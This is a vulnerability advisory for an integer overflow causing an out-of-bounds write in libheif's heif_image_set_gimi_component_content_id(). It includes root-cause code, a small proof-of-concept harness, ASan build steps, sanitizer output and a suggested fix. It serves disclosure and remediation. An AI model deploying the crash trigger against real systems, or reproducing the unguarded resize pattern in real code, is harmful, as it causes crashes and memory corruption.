# Integer overflow - OOB write in `heif_image_set_gimi_component_content_id()`

**Affected versions:** libheif ≤ 1.21.2, master `f20a88baec0f34825cc076b3dfb2578fb2d5728c` (WITH_UNCOMPRESSED_CODEC=ON builds only)  
**CWE:** CWE-190 (Integer Overflow or Wraparound), CWE-122 (Heap-Based Buffer Overflow)  
**CVSS 3.1:** 6.1 Medium (AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H)  
**Trigger:** `heif_image_set_gimi_component_content_id(img, UINT32_MAX, ...)` — no file parsing needed

---

## Root Cause

`heif_image_set_gimi_component_content_id()` (`heif_uncompressed.cc:774–787`) resizes an internal vector using `component_idx + 1` without guarding against `uint32_t` overflow:

```cpp
// heif_uncompressed.cc:774–787
void heif_image_set_gimi_component_content_id(heif_image* image,
                                              uint32_t component_idx,
                                              const char* content_id)
{
    auto ids = image->image->get_component_content_ids();
    if (component_idx >= ids.size()) {
        ids.resize(component_idx + 1);   // BUG: UINT32_MAX + 1 wraps to 0
    }
    ids[component_idx] = content_id;     // OOB write: ids[UINT32_MAX] on empty vec
    image->image->set_component_content_ids(ids);
}
```

When `component_idx = UINT32_MAX`:
1. `component_idx + 1` overflows to `0` — `ids.resize(0)` leaves the vector empty
2. `ids[UINT32_MAX]` computes a pointer 137 GiB past the start of an empty vector
3. The string assignment triggers a SEGV / UBSan report

## Proof of Concept

No binary file required, the bug is in the encoding/manipulation API.

Save as `poc_trigger.cc`:

```cpp
#include <cstdio>
#include <cstdlib>
#include <stdint.h>
#include <limits.h>
#include <libheif/heif.h>
#include <libheif/heif_uncompressed.h>

int main() {
    heif_image* img = nullptr;
    heif_image_create(4, 4, heif_colorspace_RGB, heif_chroma_444, &img);

    // UINT32_MAX + 1 wraps to 0 in uint32_t arithmetic inside the function,
    // causing ids.resize(0) followed by ids[UINT32_MAX] = content_id (OOB write).
    heif_image_set_gimi_component_content_id(img, UINT32_MAX, "poc-content-id");

    fprintf(stderr, "UNEXPECTED: no crash\n");
    heif_image_release(img);
}
```

### Build libheif with AddressSanitizer (requires WITH_UNCOMPRESSED_CODEC=ON)

```bash
git clone --depth=1 https://github.com/strukturag/libheif.git /tmp/libheif
cmake -S /tmp/libheif -B /tmp/lhbuild \
    -DCMAKE_BUILD_TYPE=Debug \
    -DCMAKE_C_COMPILER=clang -DCMAKE_CXX_COMPILER=clang++ \
    -DCMAKE_C_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
    -DCMAKE_INSTALL_PREFIX=/tmp/lhinstall \
    -DWITH_UNCOMPRESSED_CODEC=ON \
    -DWITH_LIBDE265=OFF -DWITH_X265=OFF -DWITH_EXAMPLES=OFF
cmake --build /tmp/lhbuild -j$(nproc) --target install
```

### Build and run the harness

```bash
clang++ -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
    poc_trigger.cc \
    -I/tmp/lhinstall/include -L/tmp/lhinstall/lib -Wl,-rpath,/tmp/lhinstall/lib \
    -lheif -o poc_trigger

ASAN_OPTIONS="detect_leaks=0:print_stacktrace=1" \
UBSAN_OPTIONS="print_stacktrace=1" \
    ./poc_trigger
```

### Expected output

```
stl_vector.h:1043:34: runtime error: applying non-zero offset 137438953440 to null pointer
    #0  std::vector<std::string>::operator[](unsigned long)
    #1  heif_image_set_gimi_component_content_id
            libheif/api/libheif/heif_uncompressed.cc:786

SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior stl_vector.h:1043:34

ERROR: AddressSanitizer: SEGV on unknown address 0x00047fff7ffd
    #0  std::basic_string<char>::assign(char const*)
    #1  heif_image_set_gimi_component_content_id
            libheif/api/libheif/heif_uncompressed.cc:786
    #2  main  poc_trigger.cc

SUMMARY: AddressSanitizer: SEGV heif_uncompressed.cc:786
    in heif_image_set_gimi_component_content_id
```


## Suggested Fix

Add an overflow guard before the resize in `heif_uncompressed.cc`:

```cpp
void heif_image_set_gimi_component_content_id(heif_image* image,
                                              uint32_t component_idx,
                                              const char* content_id)
{
    if (!image || !image->image || !content_id) return;
    if (component_idx == UINT32_MAX) return;  // guard: +1 would overflow

    auto ids = image->image->get_component_content_ids();
    if (component_idx >= ids.size()) {
        ids.resize(component_idx + 1);  // now safe
    }
    ids[component_idx] = content_id;
    image->image->set_component_content_ids(ids);
}
```

Alternatively, add a reasonable upper bound on component count (e.g., reject `component_idx >= 65536`).
